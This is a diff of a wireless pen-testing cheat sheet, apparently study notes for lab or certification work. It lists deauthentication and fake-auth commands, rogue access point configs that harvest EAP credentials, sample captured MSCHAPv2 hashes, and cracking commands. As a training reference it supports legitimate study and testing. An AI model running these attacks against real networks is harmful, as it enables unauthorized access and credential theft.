@@ -1,5 +1,3 @@
-
-
 # Offensive Security Wireless Pen-Testing Cheat Sheet [Pocket Version]
 
 ## Procedures by Protocol
@@ -42,7 +40,7 @@
 
 * Fake auth 
   
-  *  aireplay-ng ``aireplay-ng -1``
+  * aireplay-ng ``aireplay-ng -1``
 
 * If Fake auth worked gather new IVs [as many IVs as possible]
   
@@ -76,7 +74,7 @@
 
 * Decrypt handshake once captured
   
-  *  Aircrack
+  * Aircrack
 
 * Reconnect
   
@@ -90,9 +88,15 @@
   
   * Create config to use `mana.conf`
 
-* Packet capture to save credentials
+* EAP user config
   
-  - airodump
+  * `hostapd.eap_usr`
+  
+  * This file is referenced in `mana.conf`
+
+* OpenSSL cert generation
+  
+  - 
 
 * Spawn Rouge AP
   
@@ -180,8 +184,6 @@
 
 ----------------------------
 
-
-
 # Wifi Tools:
 
 ### 1. Hardware management
@@ -236,7 +238,6 @@ ip link set wlan0 up
   #Traditional Dumping
   airodump-ng wlan0 -c 6 --bssid 6E:89:D4:EC:34:37 -w 
   ./wireless_cap/testing_my_knowledge 
-  
   ```
 
 ### 4. Aireplay-ng
@@ -256,7 +257,7 @@ ip link set wlan0 up
   # -o 1 - Send only one set of packets at a time. Default is multiple and this confuses some APs.
   # -q 10 - Send keep alive packets every 10 seconds.
   aireplay-ng -1 6000 -o 1 -q 10 -e Lab210 -a F0:9F:C2:AA:19:29 -h BA:49:A9:53:A1:8C wlan0mon
-   
+  
   #Deauth
   aireplay-ng -0 10 -a <BSSID> wlan0mon
   aireplay-ng -0 1 -a <BSSID> -c <Client_MAC> wlan0
@@ -353,8 +354,6 @@ ip link set wlan0 up
             private_key="./client.key"
             private_key_passwd="whatever"
     }
-    
-    
     ```
 
 * Connecting  
@@ -379,7 +378,7 @@ ip link set wlan0 up
   #### HOSTAPD.CONF######
   # Interface configuration
   interface=wlan1
-  ssid=HTB-Corp
+  ssid=ENTER_SSID_HERE
   channel=1
   auth_algs=3
   wpa_key_mgmt=WPA-EAP
@@ -408,9 +407,8 @@ ip link set wlan0 up
 
 * ```bash
   ####hostapd.eap_user#####
-  * TTLS,PEAP,TLS,MD5,GTC
+  * TTLS,PEAP,TLS,MD5,GTC,FAST
   "t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5 "challenge1234" [2]
-  
   ```
 
 ## 8. OpenSSL
@@ -428,15 +426,27 @@ ip link set wlan0 up
   #server cert and private key as referenced in teh hostapd.conf file
   openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server-key.pem
   
+  #prompt will be for a challenge password.  Match what you have in the config above
+  
   #server x509 cert
-  openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem
-  
-  
+  openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem#### 9. Hostapd-wpe
   ```
 
------
+## 9. Hostapd-wpe
 
+```bash
+#exmple to start hostapd-wpe with attack options
+hostapd-wpe -c -k /etc/hostapd-wpe/hostapd-wpe.conf
+```
 
+```bash
+#example output 
+wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+MANA EAP Identity Phase 1: HTB\Sentinal.Jr
+MANA EAP EAP-MSCHAPV2 ASLEAP user=Sentinal.Jr | asleap -C b5:13:4f:4e:e1:93:f4:98 -R 32:28:b5:61:21:4b:35:fe:55:bc:61:eb:bd:b2:a1:4b:3f:79:4d:87:e6:88:e3:ff
+```
+
+  --------
 
 # Tools:
 
@@ -459,6 +469,8 @@ $[0-9]$[0-9]$[0-9]
 john --wordlist=/usr/share/john/password.lst --rules --stdout 
 | aircrack-ng -e wifu -w - ~/wpa-01.cap
 ```
+
+---
 
 #### B. Crunch
 
@@ -526,19 +538,19 @@ hashcat -m 5500 hash.txt wordlist.txt --show
 
 * Extract Email address from x509 Packet
   
-  * `tshark -r wifi-mgmt-01.cap -Y "wlan.bssid == F0:9F:C2:71:22:16 && x509sat.IA5String" -T fields -e x509sat.IA5String`
+  * `tshark -r *.cap -Y "wlan.bssid == F0:9F:C2:71:22:16 && x509sat.IA5String" -T fields -e x509sat.IA5String`
 
 * Extract potential user names from pcap
   
-  * `tshark -r WPA-01.cap -Y '(eap && wlan.ra == BSSID_MAC:ADDRESS) && (eap.identity)' -T fields -e eap.identity`
+  * `tshark -r *.cap -Y '(eap && wlan.ra == BSSID_MAC:ADDRESS) && (eap.identity)' -T fields -e eap.identity`
 
 * Pulling cert from Network PCAP
   
-  * `tshark -r capture.pcap -Y '(eap.code == 2) && (wlan.sa == BSSID_MAC:ADDRESS) && (tls.handshake.certificate)' `
+  * `tshark -r *.pcap -Y '(eap.code == 2) && (wlan.sa == BSSID_MAC:ADDRESS) && (tls.handshake.certificate)' `
   
-  * `tshark -r capture.pcap -Y 'tls.handshake.certificate' -T fields -e tls.handshake.certificate`
+  * `tshark -r *.pcap -Y 'tls.handshake.certificate' -T fields -e tls.handshake.certificate`
   
-  * `tshark -r WPA-01.cap -Y '(ssl.handshake.certificate && eapol)' -T fields -e tls.handshake.certificate -e wlan.sa -e wlan.ra`
+  * `tshark -r *.cap -Y '(ssl.handshake.certificate && eapol)' -T fields -e tls.handshake.certificate -e wlan.sa -e wlan.ra`
 
 * convert contents to PEM/DER
   
@@ -552,10 +564,8 @@ hashcat -m 5500 hash.txt wordlist.txt --show
 * `asleap -C -R -W wordlist.txt`
 
 * ``asleap -C f6:54:a4:8a:79:60:c7:d6 -R 16:37:40:99:cd:cc:17:0c:25:fc:b2:7d:e2:aa:7a:42:e3:ad:ae:a6:e7:d3:01:07 -W /usr/share/wordlists/rockyou.txt``
-
- ------------------------------
-
-
+  
+  ------------------------------
 
 # Miscellaneous
 
@@ -582,5 +592,3 @@ hashcat -m 5500 hash.txt wordlist.txt --show
 ## 4. remote desktop
 
 * ``rdesktop 192.168.0.1 -u username -p password -f -x 0x80``
-
-
